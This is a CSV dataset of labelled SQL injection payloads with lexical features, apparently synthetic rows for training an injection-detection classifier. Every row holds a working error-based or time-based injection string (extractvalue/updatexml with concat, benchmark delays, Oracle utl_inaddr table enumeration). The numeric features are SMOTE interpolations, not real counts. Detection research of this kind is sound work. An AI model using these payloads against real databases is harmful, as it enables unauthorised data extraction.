id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,error,select   (  case when   (  5322  =  6200  )   then 5322 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000065,0.001964148723765158,133.0,28.0,3.717456935001574,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000012,attack,error,"1 where 9083  =  9083 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000150,0.18998981479841096,164.0832912967884,35.91670870321161,3.9770245671233466,55.0,31.0,60.0,18.08329129678839,0.33519656240490164,0.1889289715373082,0.3656689771689836,0.11020548888880653,0.08329129678838842,0.0,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,4.0,1.0,0.08329129678838848,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000013,attack,error,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'zlxw'  =  'zlxw",nearest_attack_euclidean,R000092,0.5903679019799348,164.02368597835954,31.837280996393257,3.864231556600213,58.69824797114605,24.0,60.0,21.32543800721349,0.3576820947793988,0.14634768578309018,0.36586921445772547,0.13010100497978558,4.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,0.32543800721348726,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000014,attack,error,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000045,0.198582562418734,139.9240678950343,25.92406789503432,3.710440591889159,34.0,39.0,49.0,17.92406789503432,0.24298980943313636,0.27872360493800935,0.3501911959477553,0.12809538968109901,0.0,0.9240678950343191,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,6.0,1.0,0.0,0.9240678950343191,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000015,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000066,0.3290941045364005,161.12615655995774,32.126156559957735,3.639752062044158,50.0,23.0,68.0,20.126156559957735,0.3103171601871832,0.1427458936861043,0.4220313378545692,0.12490560827214325,0.0,0.12615655995773456,0.0,0.0,0.0,0.0,0.0,15.0,0.0,0.0,4.0,0.0,0.0,0.12615655995773456,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000016,attack,error,select   (  case when   (  3863  =  1151  )   then 3863 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000019,0.00026121747643347747,133.0,28.0,3.719854494955724,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000017,attack,error,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""ymwb""  =  ""ymwb",nearest_attack_euclidean,R000123,0.6848325693368905,160.34419380482603,29.655806195173952,3.8619098643303014,48.37677521930419,35.0,56.311612390347904,20.655806195173952,0.3016734055225872,0.21828234537387764,0.351212691598625,0.12883155750491015,0.0,4.0,0.0,0.0,0.0,1.655806195173952,0.0,10.0,0.0,0.0,5.0,1.6558061951739522,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000018,attack,error,select   (  case when   (  3863  =  1151  )   then 3863 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000019,0.008135542406698365,133.0,28.0,3.718639918707264,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000019,attack,error,"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""ikhr""  =  ""ikhr",nearest_attack_euclidean,R000116,1.6009855818837015,162.33292856919445,31.0,3.8311299189157597,56.44390475892592,24.0,60.0,21.889023810268522,0.3473706335456874,0.14789440496814688,0.36973601242036724,0.13499894906579846,0.0,4.0,0.0,0.0,0.0,1.0,0.0,12.0,0.8890238102685208,0.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000020,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'lgat' like 'lgat",nearest_attack_euclidean,R000084,0.6060405802625664,161.69102540677596,30.0,3.88409565545072,50.76410162710387,35.0,55.617949186448065,20.308974593224033,0.31392727330873693,0.2164640024063661,0.3439959117717931,0.12561281251310383,4.0,0.0,0.0,0.0,0.0,1.308974593224032,0.0,10.0,0.0,0.0,5.0,1.3089745932240322,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,2.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000021,attack,error,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,nearest_attack_euclidean,R000033,0.36996084292817255,155.0,27.66069770033865,3.7666706941939667,38.98209310101595,36.3572091986454,56.3213954006773,23.339302299661348,0.2514973748452642,0.23456263999126065,0.36336384129469224,0.1505761438687829,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.33930229966135,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,2.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000022,attack,error,"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000153,0.889823534296461,141.47879190954563,26.39124534338382,3.680920440734334,32.82626396984854,39.0,50.65252793969709,19.0,0.23192339506609977,0.2759293669131704,0.3577201105502109,0.13442712747051894,1.0,0.0,0.0,0.0,0.0,1.0,0.0,10.608754656616181,0.0,0.0,6.391245343383819,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.6087546566161811,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6087546566161812
SMOTE_000023,attack,error,"  (  updatexml  (  8862,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  8862  =  8862,1   )    )     )  ,0x717a767a71  )  ,8981   )    )   ",nearest_attack_euclidean,R000128,0.501825962277146,144.20872964177488,24.20872964177489,3.499985325144576,32.186905537337665,36.41745928354978,57.0,18.604364820887447,0.22327613619575307,0.2524523689282504,0.39527863083765763,0.1289928640383389,0.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,5.6043648208874455,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000024,attack,error,"1' where 2162  =  2162 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000154,1.111143393384888,165.0,34.35144909667223,3.9577680513613953,56.08091817221295,29.486714558901873,60.0,19.43236726888518,0.33988435255886634,0.17870736096304166,0.36363636363636365,0.11777192284172835,1.6485509033277683,0.0,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,4.0,1.0,1.0,0.0,0.0,0.7838163655574104,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.7838163655574104,0.0,0.21618363444258948,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000025,attack,error,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000132,0.1879185924896357,138.93133177874253,25.0,3.617977588108522,35.79399533622758,35.27467288502989,50.86266355748506,17.0,0.25762889207073836,0.25391423828397275,0.36609385433085984,0.122363015314429,0.0,0.9313317787425275,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,5.0686682212574725,1.0,0.0,0.9313317787425275,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000026,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000006,0.7061385087797016,148.20967906940493,39.0,4.170203247235209,74.25434382795801,0.9999999999999964,53.0,19.95533524144691,0.500347522388964,0.006760123622471359,0.35828655199098314,0.13460580199758146,3.0,0.0,0.0,0.0,0.0,2.0,0.0,8.0,0.0,4.433002862170365,-4.440892098500626e-16,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-1.3877787807814457e-17,1.0,2.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000027,attack,error,select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000051,0.01327096145018049,133.0,29.0,3.7422471474303456,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000028,attack,error,"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  -- btqa",nearest_attack_euclidean,R000119,1.7717648782780242,141.68562075119763,26.579551750513275,3.7155393170924156,35.10606900068437,39.0,49.52651725017109,18.053034500342186,0.2475768134585168,0.2754253268717287,0.3496783590062432,0.12731950066351133,0.0,0.0,1.0530345003421844,0.0,0.0,1.0,0.0,10.0,0.0,0.0,6.0,2.0530345003421844,0.0,0.0,0.5265172501710922,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
